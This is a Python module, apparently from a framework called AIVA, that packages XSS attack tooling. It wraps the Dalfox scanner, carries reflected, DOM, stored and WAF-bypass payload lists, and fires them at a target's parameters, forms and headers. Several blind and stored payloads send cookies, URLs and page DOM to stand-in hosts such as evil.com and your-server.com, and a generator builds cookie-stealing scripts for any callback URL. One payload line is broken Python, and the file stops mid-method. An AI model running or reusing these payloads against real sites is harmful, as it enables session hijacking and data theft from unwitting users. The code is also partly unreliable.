#!/usr/bin/env python3
"""
AIVA XSS Attack Tools - Task 13
整合 AIVA 現有 XSS 功能與 HackingTool 工具集
專業級 XSS 漏洞檢測和利用工具
"""

import asyncio
import json
import logging
import os
import re
import subprocess
import tempfile
import time
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Union
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote

import aiohttp
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.text import Text

# 本地導入
from ...core.base_capability import BaseCapability
from ...core.registry import CapabilityRegistry

console = Console()
logger = logging.getLogger(__name__)


@dataclass
class XSSTarget:
    """XSS 攻擊目標"""
    url: str
    method: str = "GET"
    parameters: Dict[str, str] = None
    headers: Dict[str, str] = None
    cookies: Dict[str, str] = None
    data: Optional[str] = None
    forms: List[Dict] = None
    dom_sources: List[str] = None
    priority: str = "medium"  # high, medium, low
    
    def __post_init__(self):
        if self.parameters is None:
            self.parameters = {}
        if self.headers is None:
            self.headers = {}
        if self.cookies is None:
            self.cookies = {}
        if self.forms is None:
            self.forms = []
        if self.dom_sources is None:
            self.dom_sources = []


@dataclass
class XSSVulnerability:
    """XSS 漏洞"""
    target_url: str
    parameter: str
    xss_type: str  # Reflected, Stored, DOM, Blind
    payload: str
    context: str  # HTML, Attribute, Script, etc.
    severity: str  # Critical, High, Medium, Low
    confidence: int  # 0-100
    evidence: str
    exploitation_proof: str
    business_impact: str
    remediation: str
    timestamp: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()


class DalfoxIntegration:
    """Dalfox XSS 掃描器整合"""
    
    def __init__(self):
        self.dalfox_path = self._find_dalfox_path()
        self.scan_results = []
    
    def _find_dalfox_path(self) -> Optional[str]:
        """查找 Dalfox 安裝路徑"""
        possible_paths = [
            "dalfox",
            "~/go/bin/dalfox",
            "/usr/local/bin/dalfox",
            "/usr/bin/dalfox",
            os.path.expanduser("~/go/bin/dalfox")
        ]
        
        for path in possible_paths:
            try:
                result = subprocess.run([path, "--version"], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    return path
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue
        
        return None
    
    async def install_dalfox(self) -> bool:
        """安裝 Dalfox"""
        if self.dalfox_path:
            console.print("[green]Dalfox 已安裝[/green]")
            return True
        
        console.print("[yellow]正在安裝 Dalfox...[/yellow]")
        
        try:
            # 檢查 Go 是否已安裝
            go_check = subprocess.run(["go", "version"], 
                                    capture_output=True, text=True)
            if go_check.returncode != 0:
                console.print("[red]請先安裝 Go 語言環境[/red]")
                return False
            
            # 安裝 Dalfox
            install_cmd = ["go", "install", "github.com/hahwul/dalfox/v2@latest"]
            process = await asyncio.create_subprocess_exec(
                *install_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                self.dalfox_path = os.path.expanduser("~/go/bin/dalfox")
                console.print("[green]✅ Dalfox 安裝成功[/green]")
                return True
            else:
                console.print(f"[red]Dalfox 安裝失敗: {stderr.decode()}[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]安裝 Dalfox 時發生錯誤: {e}[/red]")
            return False
    
    async def scan_target(self, target: XSSTarget, options: Dict[str, Any] = None) -> List[XSSVulnerability]:
        """使用 Dalfox 掃描目標"""
        if not self.dalfox_path:
            console.print("[yellow]Dalfox 未安裝，嘗試安裝...[/yellow]")
            if not await self.install_dalfox():
                return []
        
        vulnerabilities = []
        options = options or {}
        
        try:
            # 構建 Dalfox 命令
            cmd = [self.dalfox_path, "url", target.url]
            
            # 添加選項
            if options.get('blind'):
                cmd.extend(["--blind", options['blind']])
            
            if options.get('delay'):
                cmd.extend(["--delay", str(options['delay'])])
            
            if options.get('timeout'):
                cmd.extend(["--timeout", str(options['timeout'])])
            
            if target.headers:
                for key, value in target.headers.items():
                    cmd.extend(["-H", f"{key}: {value}"])
            
            if target.cookies:
                cookie_str = "; ".join([f"{k}={v}" for k, v in target.cookies.items()])
                cmd.extend(["-H", f"Cookie: {cookie_str}"])
            
            # 設置輸出格式
            cmd.extend(["--format", "json"])
            
            console.print(f"[cyan]執行 Dalfox: {' '.join(cmd[:3])}...[/cyan]")
            
            # 執行 Dalfox
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                vulnerabilities = self._parse_dalfox_output(stdout.decode(), target.url)
            else:
                logger.warning(f"Dalfox 掃描警告: {stderr.decode()}")
                
        except Exception as e:
            logger.error(f"Dalfox 掃描失敗: {e}")
        
        return vulnerabilities
    
    def _parse_dalfox_output(self, output: str, target_url: str) -> List[XSSVulnerability]:
        """解析 Dalfox 輸出"""
        vulnerabilities = []
        
        try:
            # Dalfox 的 JSON 輸出格式
            lines = output.strip().split('\n')
            for line in lines:
                if line.startswith('{'):
                    try:
                        result = json.loads(line)
                        
                        if result.get('type') == 'found':
                            vuln = XSSVulnerability(
                                target_url=target_url,
                                parameter=result.get('param', 'unknown'),
                                xss_type='Reflected XSS',
                                payload=result.get('payload', ''),
                                context=result.get('evidence', {}).get('context', 'HTML'),
                                severity='High',
                                confidence=90,
                                evidence=result.get('evidence', {}).get('text', ''),
                                exploitation_proof=f"Dalfox detected XSS: {result.get('payload', '')}",
                                business_impact="Cross-site scripting vulnerability allows attackers to execute malicious scripts",
                                remediation="Implement proper input validation and output encoding"
                            )
                            vulnerabilities.append(vuln)
                    except json.JSONDecodeError:
                        continue
                        
        except Exception as e:
            logger.error(f"解析 Dalfox 輸出失敗: {e}")
        
        return vulnerabilities


class XSSPayloadGenerator:
    """XSS 載荷生成器"""
    
    def __init__(self):
        self.payloads = self._load_payloads()
        self.context_payloads = self._load_context_specific_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """載入基礎 XSS 載荷"""
        return {
            'basic_reflected': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(`XSS`)"></iframe>',
                '<body onload=alert("XSS")>',
                '<input autofocus onfocus=alert("XSS")>',
                '<select onfocus=alert("XSS") autofocus>'
            ],
            
            'dom_xss': [
                '#<script>alert("DOM XSS")</script>',
                '#"><img src=x onerror=alert("DOM XSS")>',
                '?search=<script>alert("DOM XSS")</script>',
                '#javascript:alert("DOM XSS")',
                '"><svg onload=alert("DOM XSS")>'
            ],
            
            'stored_xss': [
                '<script>alert("Stored XSS")</script>',
                '<img src="x" onerror="alert(\'Stored XSS\')">',
                '<svg/onload=alert("Stored XSS")>',
                '"><script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
                '<iframe src="javascript:alert(`Stored XSS`)"></iframe>'
            ],
            
            'blind_xss': [
                '<script>fetch("http://your-server.com/xss?data="+btoa(document.cookie))</script>',
                '<img src="http://your-server.com/xss.png?data='+document.cookie+'">',
                '<script>new Image().src="http://your-server.com/xss?cookie="+document.cookie</script>',
                '<script>navigator.sendBeacon("http://your-server.com/xss", document.cookie)</script>'
            ],
            
            'waf_bypass': [
                '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script/src=data:,alert("XSS")></script>',
                '<svg onload=eval(atob("YWxlcnQoJ1hTUycpOw=="))>',  # base64: alert('XSS');
                '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>',
                '<%2fscript><%2fscript>alert("XSS")<%2fscript>',
                '<script>/**/alert("XSS")/**/</script>',
                '<script>alert`XSS`</script>',
                '<svg><script>alert&#40;1&#41;</script>',
                '<script>setTimeout("alert(\\"XSS\\")",1)</script>'
            ]
        }
    
    def _load_context_specific_payloads(self) -> Dict[str, List[str]]:
        """載入上下文特定載荷"""
        return {
            'html_context': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>'
            ],
            
            'attribute_context': [
                '" onmouseover="alert(`XSS`)" "',
                '\' onfocus=alert("XSS") autofocus \'',
                '"><script>alert("XSS")</script><"'
            ],
            
            'script_context': [
                '</script><script>alert("XSS")</script>',
                '";alert("XSS");//',
                '\';alert("XSS");//'
            ],
            
            'css_context': [
                '</style><script>alert("XSS")</script>',
                'expression(alert("XSS"))',
                'javascript:alert("XSS")'
            ],
            
            'url_context': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:msgbox("XSS")'
            ]
        }
    
    def generate_payloads(self, xss_type: str = 'basic_reflected', 
                         context: str = 'html_context', 
                         waf_bypass: bool = False) -> List[str]:
        """生成特定類型的 XSS 載荷"""
        payloads = []
        
        # 基礎載荷
        if xss_type in self.payloads:
            payloads.extend(self.payloads[xss_type])
        
        # 上下文特定載荷
        if context in self.context_payloads:
            payloads.extend(self.context_payloads[context])
        
        # WAF 繞過載荷
        if waf_bypass:
            payloads.extend(self.payloads['waf_bypass'])
        
        return payloads
    
    def generate_custom_payload(self, callback_url: str = None, 
                              data_to_extract: str = "document.cookie") -> str:
        """生成自定義載荷"""
        if callback_url:
            return f'<script>fetch("{callback_url}?data="+btoa({data_to_extract}))</script>'
        else:
            return f'<script>alert({data_to_extract})</script>'


class DOMXSSDetector:
    """DOM XSS 檢測器 - 整合 AIVA 現有功能"""
    
    def __init__(self):
        self.dom_sources = [
            'document.URL', 'document.documentURI', 'document.baseURI',
            'location.href', 'location.search', 'location.hash',
            'window.name', 'document.referrer'
        ]
        self.dom_sinks = [
            'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
            'eval', 'setTimeout', 'setInterval', 'Function',
            'location.href', 'location.assign', 'location.replace'
        ]
    
    async def scan_dom_xss(self, target: XSSTarget) -> List[XSSVulnerability]:
        """掃描 DOM XSS 漏洞"""
        vulnerabilities = []
        
        try:
            # 獲取頁面內容
            async with aiohttp.ClientSession() as session:
                async with session.get(target.url, 
                                     headers=target.headers,
                                     cookies=target.cookies) as response:
                    content = await response.text()
                    
                    # 分析 JavaScript 代碼
                    js_vulns = self._analyze_javascript(content, target.url)
                    vulnerabilities.extend(js_vulns)
                    
                    # 動態測試
                    dynamic_vulns = await self._test_dom_payloads(target, session)
                    vulnerabilities.extend(dynamic_vulns)
                    
        except Exception as e:
            logger.error(f"DOM XSS 掃描失敗: {e}")
        
        return vulnerabilities
    
    def _analyze_javascript(self, content: str, url: str) -> List[XSSVulnerability]:
        """分析 JavaScript 代碼中的 DOM XSS"""
        vulnerabilities = []
        
        # 提取 JavaScript 代碼
        soup = BeautifulSoup(content, 'html.parser')
        scripts = soup.find_all('script')
        
        for script in scripts:
            if script.string:
                js_code = script.string
                
                # 檢查危險的 source -> sink 組合
                for source in self.dom_sources:
                    if source in js_code:
                        for sink in self.dom_sinks:
                            if sink in js_code:
                                # 簡單的靜態分析
                                pattern = rf'{re.escape(source)}.*{re.escape(sink)}'
                                if re.search(pattern, js_code, re.DOTALL):
                                    vuln = XSSVulnerability(
                                        target_url=url,
                                        parameter='DOM',
                                        xss_type='DOM XSS',
                                        payload=f'#{source} -> {sink}',
                                        context='JavaScript',
                                        severity='High',
                                        confidence=75,
                                        evidence=f'Found {source} -> {sink} pattern in JavaScript',
                                        exploitation_proof=f'Potential DOM XSS via {source} to {sink}',
                                        business_impact='DOM-based XSS can lead to account takeover',
                                        remediation='Use safe DOM manipulation methods and validate all inputs'
                                    )
                                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_dom_payloads(self, target: XSSTarget, session: aiohttp.ClientSession) -> List[XSSVulnerability]:
        """動態測試 DOM XSS 載荷"""
        vulnerabilities = []
        
        dom_payloads = [
            '#<script>alert("DOM XSS")</script>',
            '#"><img src=x onerror=alert("DOM XSS")>',
            '?test=<script>alert("DOM XSS")</script>',
            '#javascript:alert("DOM XSS")'
        ]
        
        for payload in dom_payloads:
            test_url = target.url + payload
            
            try:
                async with session.get(test_url, 
                                     headers=target.headers,
                                     cookies=target.cookies) as response:
                    content = await response.text()
                    
                    # 檢查載荷是否在頁面中被執行
                    if self._check_xss_execution(content, payload):
                        vuln = XSSVulnerability(
                            target_url=test_url,
                            parameter='URL fragment/parameter',
                            xss_type='DOM XSS',
                            payload=payload,
                            context='DOM',
                            severity='High',
                            confidence=85,
                            evidence='DOM XSS payload execution detected',
                            exploitation_proof=f'Payload {payload} executed in DOM context',
                            business_impact='DOM XSS vulnerability allows client-side code execution',
                            remediation='Implement proper DOM sanitization and validation'
                        )
                        vulnerabilities.append(vuln)
                        
            except Exception as e:
                logger.warning(f"DOM XSS 測試失敗: {e}")
        
        return vulnerabilities
    
    def _check_xss_execution(self, content: str, payload: str) -> bool:
        """檢查 XSS 載荷是否可能被執行"""
        # 簡化的檢查邏輯
        indicators = [
            '<script>alert("DOM XSS")</script>',
            'onerror=alert("DOM XSS")',
            'javascript:alert("DOM XSS")'
        ]
        
        return any(indicator in content for indicator in indicators)


class StoredXSSDetector:
    """存儲型 XSS 檢測器"""
    
    def __init__(self):
        self.test_payloads = [
            '<script>alert("Stored XSS Test")</script>',
            '<img src="x" onerror="alert(\'Stored XSS\')">',
            '<svg/onload=alert("Stored XSS")>',
            '"><script>console.log("Stored XSS")</script>',
            '<iframe src="javascript:alert(`Stored XSS`)"></iframe>'
        ]
        self.unique_marker = f"STORED_XSS_{int(time.time())}"
    
    async def scan_stored_xss(self, target: XSSTarget) -> List[XSSVulnerability]:
        """掃描存儲型 XSS 漏洞"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession() as session:
                # 1. 提交可能的存儲型 XSS 載荷
                await self._submit_payloads(target, session)
                
                # 2. 等待一段時間讓系統處理
                await asyncio.sleep(2)
                
                # 3. 檢查載荷是否被存儲和執行
                stored_vulns = await self._check_stored_execution(target, session)
                vulnerabilities.extend(stored_vulns)
                
        except Exception as e:
            logger.error(f"存儲型 XSS 掃描失敗: {e}")
        
        return vulnerabilities
    
    async def _submit_payloads(self, target: XSSTarget, session: aiohttp.ClientSession):
        """提交存儲型 XSS 載荷"""
        for payload in self.test_payloads:
            # 為每個載荷添加唯一標識
            unique_payload = payload.replace('Stored XSS', f'Stored XSS {self.unique_marker}')
            
            # 測試所有可能的參數
            for param_name in target.parameters.keys():
                test_params = target.parameters.copy()
                test_params[param_name] = unique_payload
                
                try:
                    if target.method.upper() == 'POST':
                        data = urlencode(test_params)
                        await session.post(target.url, 
                                         data=data,
                                         headers=target.headers,
                                         cookies=target.cookies)
                    else:
                        params_str = urlencode(test_params)
                        test_url = f"{target.url}?{params_str}"
                        await session.get(test_url,
                                        headers=target.headers,
                                        cookies=target.cookies)
                        
                except Exception as e:
                    logger.warning(f"提交載荷失敗: {e}")
    
    async def _check_stored_execution(self, target: XSSTarget, session: aiohttp.ClientSession) -> List[XSSVulnerability]:
        """檢查存儲的載荷是否被執行"""
        vulnerabilities = []
        
        try:
            # 訪問可能顯示存儲內容的頁面
            check_urls = [
                target.url,
                target.url.replace('/submit', '/view'),
                target.url.replace('/post', '/comments'),
                target.url + '/comments',
                target.url + '/view'
            ]
            
            for check_url in check_urls:
                try:
                    async with session.get(check_url,
                                         headers=target.headers,
                                         cookies=target.cookies) as response:
                        content = await response.text()
                        
                        # 檢查我們的唯一標識是否出現在頁面中
                        if self.unique_marker in content:
                            # 進一步檢查是否為 XSS
                            if self._detect_stored_xss(content):
                                vuln = XSSVulnerability(
                                    target_url=check_url,
                                    parameter='stored_content',
                                    xss_type='Stored XSS',
                                    payload=f'<script>alert("Stored XSS {self.unique_marker}")</script>',
                                    context='HTML',
                                    severity='Critical',
                                    confidence=90,
                                    evidence=f'Stored XSS payload with marker {self.unique_marker} found in response',
                                    exploitation_proof='Stored XSS payload persisted and executed',
                                    business_impact='Stored XSS affects all users visiting the page',
                                    remediation='Implement proper input validation and output encoding for stored content'
                                )
                                vulnerabilities.append(vuln)
                                
                except Exception as e:
                    logger.warning(f"檢查存儲執行失敗: {e}")
                    
        except Exception as e:
            logger.error(f"存儲型 XSS 檢查失敗: {e}")
        
        return vulnerabilities
    
    def _detect_stored_xss(self, content: str) -> bool:
        """檢測存儲型 XSS"""
        xss_indicators = [
            f'<script>alert("Stored XSS {self.unique_marker}")</script>',
            f'onerror="alert(\'Stored XSS {self.unique_marker}\')"',
            f'onload=alert("Stored XSS {self.unique_marker}")'
        ]
        
        return any(indicator in content for indicator in xss_indicators)


class BlindXSSDetector:
    """盲 XSS 檢測器"""
    
    def __init__(self, callback_server: str = None):
        self.callback_server = callback_server or "http://your-blind-xss-server.com"
        self.session_id = f"blind_xss_{int(time.time())}"
        self.payloads = self._generate_blind_payloads()
    
    def _generate_blind_payloads(self) -> List[str]:
        """生成盲 XSS 載荷"""
        return [
            f'<script>fetch("{self.callback_server}/callback?id={self.session_id}&data="+btoa(document.cookie+"|"+document.domain+"|"+window.location.href))</script>',
            f'<img src="{self.callback_server}/img?id={self.session_id}&data="+document.cookie>',
            f'<script>new Image().src="{self.callback_server}/ping?id={self.session_id}&cookie="+document.cookie+"&url="+encodeURIComponent(window.location.href)</script>',
            f'<script>navigator.sendBeacon("{self.callback_server}/beacon?id={self.session_id}", JSON.stringify({{cookie:document.cookie,url:window.location.href,dom:document.documentElement.innerHTML.substring(0,1000)}}))</script>',
            f'<svg onload="fetch(\'{self.callback_server}/svg?id={self.session_id}&data=\'+btoa(document.cookie))">',
            f'<iframe src="javascript:fetch(\'{self.callback_server}/iframe?id={self.session_id}&data=\'+btoa(document.cookie+\'|\'+window.location.href))"></iframe>'
        ]
    
    async def scan_blind_xss(self, target: XSSTarget) -> List[XSSVulnerability]:
        """掃描盲 XSS 漏洞"""
        vulnerabilities = []
        
        console.print(f"[yellow]注意: 盲 XSS 檢測需要外部回調服務器[/yellow]")
        console.print(f"[cyan]當前回調服務器: {self.callback_server}[/cyan]")
        console.print(f"[cyan]會話 ID: {self.session_id}[/cyan]")
        
        try:
            async with aiohttp.ClientSession() as session:
                # 提交盲 XSS 載荷到各種可能的位置
                await self._submit_blind_payloads(target, session)
                
                # 提示用戶檢查回調服務器
                console.print(f"[green]盲 XSS 載荷已提交，請檢查回調服務器 {self.callback_server} 是否收到請求[/green]")
                console.print(f"[yellow]會話 ID: {self.session_id}[/yellow]")
                
                # 創建一個潛在的盲 XSS 漏洞記錄
                vuln = XSSVulnerability(
                    target_url=target.url,
                    parameter='blind_xss_test',
                    xss_type='Blind XSS',
                    payload=self.payloads[0],
                    context='Unknown',
                    severity='High',
                    confidence=50,  # 低置信度，需要手動確認
                    evidence=f'Blind XSS payloads submitted with session ID {self.session_id}',
                    exploitation_proof=f'Check callback server {self.callback_server} for requests with ID {self.session_id}',
                    business_impact='Blind XSS can lead to admin account compromise',
                    remediation='Implement proper input validation for all user-submitted content'
                )
                vulnerabilities.append(vuln)
                
        except Exception as e:
            logger.error(f"盲 XSS 掃描失敗: {e}")
        
        return vulnerabilities
    
    async def _submit_blind_payloads(self, target: XSSTarget, session: aiohttp.ClientSession):
        """提交盲 XSS 載荷"""
        # 測試各種提交方式
        submission_methods = [
            self._submit_via_forms,
            self._submit_via_parameters,
            self._submit_via_headers,
            self._submit_via_user_agent
        ]
        
        for method in submission_methods:
            try:
                await method(target, session)
            except Exception as e:
                logger.warning(f"盲 XSS 提交方法失敗: {e}")
    
    async def _submit_via_forms(self, target: XSSTarget, session: aiohttp.ClientSession):
        """通過表單提交盲 XSS 載荷"""
        for payload in self.payloads:
            for param_name in target.parameters.keys():
                test_params = target.parameters.copy()
                test_params[param_name] = payload
                
                try:
                    if target.method.upper() == 'POST':
                        data = urlencode(test_params)
                        await session.post(target.url, 
                                         data=data,
                                         headers=target.headers,
                                         cookies=target.cookies)
                    else:
                        params_str = urlencode(test_params)
                        test_url = f"{target.url}?{params_str}"
                        await session.get(test_url,
                                        headers=target.headers,
                                        cookies=target.cookies)
                except Exception as e:
                    logger.warning(f"表單提交失敗: {e}")
    
    async def _submit_via_parameters(self, target: XSSTarget, session: aiohttp.ClientSession):
        """通過參數提交盲 XSS 載荷"""
        # 嘗試各種常見參數名
        common_params = ['q', 'search', 'query', 'name', 'comment', 'message', 'title', 'description']
        
        for payload in self.payloads[:2]:  # 只使用前兩個載荷避免過多請求
            for param in common_params:
                try:
                    test_url = f"{target.url}?{param}={quote(payload)}"
                    await session.get(test_url,
                                    headers=target.headers,
                                    cookies=target.cookies)
                except Exception as e:
                    logger.warning(f"參數提交失敗: {e}")
    
    async def _submit_via_headers(self, target: XSSTarget, session: aiohttp.ClientSession):
        """通過 HTTP 頭提交盲 XSS 載荷"""
        header_payloads = [
            f'<script>fetch("{self.callback_server}/header?id={self.session_id}&source=referer")</script>',
            f'<img src="{self.callback_server}/header?id={self.session_id}&source=x-forwarded-for">'
        ]
        
        test_headers = target.headers.copy()
        
        for payload in header_payloads:
            # 測試常見的頭部
            test_headers.update({
                'Referer': payload,
                'X-Forwarded-For': payload,
                'X-Real-IP': payload,
                'X-Originating-IP': payload
            })
            
            try:
                await session.get(target.url,
                                headers=test_headers,
                                cookies=target.cookies)
            except Exception as e:
                logger.warning(f"頭部提交失敗: {e}")
    
    async def _submit_via_user_agent(self, target: XSSTarget, session: aiohttp.ClientSession):
        """通過 User-Agent 提交盲 XSS 載荷"""
        ua_payload = f'Mozilla/5.0 <script>fetch("{self.callback_server}/ua?id={self.session_id}")</script>'
        
        test_headers = target.headers.copy()
        test_headers['User-Agent'] = ua_payload
        
        try:
            await session.get(target.url,
                            headers=test_headers,
                            cookies=target.cookies)
        except Exception as e:
            logger.warning(f"User-Agent 提交失敗: {e}")


class XSSManager:
    """XSS 攻擊管理器"""
    
    def __init__(self):
        self.dalfox = DalfoxIntegration()
        self.payload_generator = XSSPayloadGenerator()
        self.dom_detector = DOMXSSDetector()
        self.stored_detector = StoredXSSDetector()
        self.blind_detector = BlindXSSDetector()
        self.scan_results = []
    
    def _parse_target(self, target_url: str, options: Dict[str, Any] = None) -> XSSTarget:
        """解析目標 URL"""
        options = options or {}
        parsed_url = urlparse(target_url)
        parameters = parse_qs(parsed_url.query)
        # 扁平化參數
        flat_params = {k: v[0] if v else '' for k, v in parameters.items()}
        
        return XSSTarget(
            url=f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}",
            method=options.get('method', 'GET'),
            parameters=flat_params,
            headers=options.get('headers', {}),
            cookies=options.get('cookies', {}),
            data=options.get('data'),
            priority=options.get('priority', 'medium')
        )
    
    async def comprehensive_scan(self, target_url: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """綜合 XSS 掃描"""
        options = options or {}
        target = self._parse_target(target_url, options)
        
        console.print(f"[bold yellow]🎯 開始綜合 XSS 掃描: {target_url}[/bold yellow]")
        
        results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'dalfox_results': [],
            'dom_xss_results': [],
            'stored_xss_results': [],
            'blind_xss_results': [],
            'custom_scan_results': [],
            'summary': {}
        }
        
        # 1. Dalfox 掃描
        if options.get('use_dalfox', True):
            console.print("[cyan]🔍 執行 Dalfox 掃描...[/cyan]")
            try:
                dalfox_vulns = await self.dalfox.scan_target(target, options.get('dalfox_options', {}))
                results['dalfox_results'] = [asdict(v) for v in dalfox_vulns]
                self.scan_results.extend(dalfox_vulns)
            except Exception as e:
                logger.error(f"Dalfox 掃描失敗: {e}")
        
        # 2. DOM XSS 檢測
        if options.get('scan_dom', True):
            console.print("[cyan]🔍 執行 DOM XSS 檢測...[/cyan]")
            try:
                dom_vulns = await self.dom_detector.scan_dom_xss(target)
                results['dom_xss_results'] = [asdict(v) for v in dom_vulns]
                self.scan_results.extend(dom_vulns)
            except Exception as e:
                logger.error(f"DOM XSS 檢測失敗: {e}")
        
        # 3. 存儲型 XSS 檢測
        if options.get('scan_stored', True):
            console.print("[cyan]🔍 執行存儲型 XSS 檢測...[/cyan]")
            try:
                stored_vulns = await self.stored_detector.scan_stored_xss(target)
                results['stored_xss_results'] = [asdict(v) for v in stored_vulns]
                self.scan_results.extend(stored_vulns)
            except Exception as e:
                logger.error(f"存儲型 XSS 檢測失敗: {e}")
        
        # 4. 盲 XSS 檢測
        if options.get('scan_blind', False):  # 默認關閉，需要外部服務器
            console.print("[cyan]🔍 執行盲 XSS 檢測...[/cyan]")
            try:
                if options.get('callback_server'):
                    self.blind_detector.callback_server = options['callback_server']
                blind_vulns = await self.blind_detector.scan_blind_xss(target)
                results['blind_xss_results'] = [asdict(v) for v in blind_vulns]
                self.scan_results.extend(blind_vulns)
            except Exception as e:
                logger.error(f"盲 XSS 檢測失敗: {e}")
        
        # 5. 自定義掃描
        if options.get('custom_scan', True):
            console.print("[cyan]🔍 執行自定義 XSS 掃描...[/cyan]")
            try:
                custom_vulns = await self._custom_xss_scan(target)
                results['custom_scan_results'] = [asdict(v) for v in custom_vulns]
                self.scan_results.extend(custom_vulns)
            except Exception as e:
                logger.error(f"自定義 XSS 掃描失敗: {e}")
        
        # 生成摘要
        results['summary'] = self._generate_summary(results)
        
        console.print(f"[bold green]✅ XSS 掃描完成！[/bold green]")
        return results
    
    async def _custom_xss_scan(self, target: XSSTarget) -> List[XSSVulnerability]:
        """自定義 XSS 掃描"""
        vulnerabilities = []
        
        # 生成測試載荷
        payloads = self.payload_generator.generate_payloads('basic_reflected', 'html_context', waf_bypass=True)
        
        try:
            async with aiohttp.ClientSession() as session:
                # 測試每個參數
                for param_name in target.parameters.keys():
                    for payload in payloads[:5]:  # 限制載荷數量
                        test_params = target.parameters.copy()
                        test_params[param_name] = payload
                        
                        try:
                            if target.method.upper() == 'POST':
                                data = urlencode(test_params)
                                async with session.post(target.url, 
                                                       data=data,
                                                       headers=target.headers,
                                                       cookies=target.cookies) as response:
                                    content = await response.text()
                            else:
                                params_str = urlencode(test_params)
                                test_url = f"{target.url}?{params_str}"
                                async with session.get(test_url,
                                                     headers=target.headers,
                                                     cookies=target.cookies) as response:
                                    content = await response.text()
                            
                            # 檢查 XSS
                            if self._check_xss_reflection(content, payload):
                                vuln = XSSVulnerability(
                                    target_url=target.url,
                                    parameter=param_name,
                                    xss_type='Reflected XSS',
                                    payload=payload,
                                    context='HTML',
                                    severity='High',
                                    confidence=85,
                                    evidence=f'XSS payload reflected in response: {payload[:50]}...',
                                    exploitation_proof=f'Custom XSS scan detected reflection of payload in parameter {param_name}',
                                    business_impact='Reflected XSS can lead to session hijacking and user account compromise',
                                    remediation='Implement proper input validation and output encoding'
                                )
                                vulnerabilities.append(vuln)
                                
                        except Exception as e:
                            logger.warning(f"自定義 XSS 測試失敗: {e}")
                            
        except Exception as e:
            logger.error(f"自定義 XSS 掃描失敗: {e}")
        
        return vulnerabilities
    
    def _check_xss_reflection(self, content: str, payload: str) -> bool:
        """檢查 XSS 載荷是否被反射"""
        # 簡化的反射檢查
        return payload in content or payload.replace('"', '&quot;') in content
    
    def _generate_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """生成掃描摘要"""
        all_vulns = []
        
        # 收集所有漏洞
        for key in ['dalfox_results', 'dom_xss_results', 'stored_xss_results', 'blind_xss_results', 'custom_scan_results']:
            all_vulns.extend(results.get(key, []))
        
        summary = {
            'total_vulnerabilities': len(all_vulns),
            'critical_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == 'Critical'),
            'high_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == 'High'),
            'medium_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == 'Medium'),
            'low_vulnerabilities': sum(1 for v in all_vulns if v.get('severity') == 'Low'),
            'xss_types': {
                'reflected': sum(1 for v in all_vulns if 'Reflected' in v.get('xss_type', '')),
                'stored': sum(1 for v in all_vulns if 'Stored' in v.get('xss_type', '')),
                'dom': sum(1 for v in all_vulns if 'DOM' in v.get('xss_type', '')),
                'blind': sum(1 for v in all_vulns if 'Blind' in v.get('xss_type', ''))
            },
            'scan_methods': {
                'dalfox': len(results.get('dalfox_results', [])),
                'dom_detection': len(results.get('dom_xss_results', [])),
                'stored_detection': len(results.get('stored_xss_results', [])),
                'blind_detection': len(results.get('blind_xss_results', [])),
                'custom_scan': len(results.get('custom_scan_results', []))
            }
        }
        
        return summary


class XSSCapability(BaseCapability):
    """XSS 攻擊能力"""
    
    def __init__(self):
        super().__init__()
        self.name = "xss_attack_tools"
        self.version = "1.0.0"
        self.description = "專業 XSS 攻擊工具集，整合 AIVA 現有功能與 HackingTool 工具"
        self.dependencies = ["aiohttp", "requests", "beautifulsoup4", "rich"]
        self.manager = XSSManager()
    
    async def initialize(self) -> bool:
        """初始化能力"""
        try:
            console.print("[yellow]初始化 XSS 攻擊工具集...[/yellow]")
            return True
        except Exception as e:
            logger.error(f"初始化失敗: {e}")
            return False
    
    async def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """執行命令"""
        try:
            if command == "comprehensive_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                results = await self.manager.comprehensive_scan(target_url, parameters.get('options', {}))
                return {"success": True, "data": results}
            
            elif command == "dalfox_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                target = self.manager._parse_target(target_url, parameters.get('options', {}))
                vulns = await self.manager.dalfox.scan_target(target, parameters.get('dalfox_options', {}))
                return {"success": True, "data": [asdict(v) for v in vulns]}
            
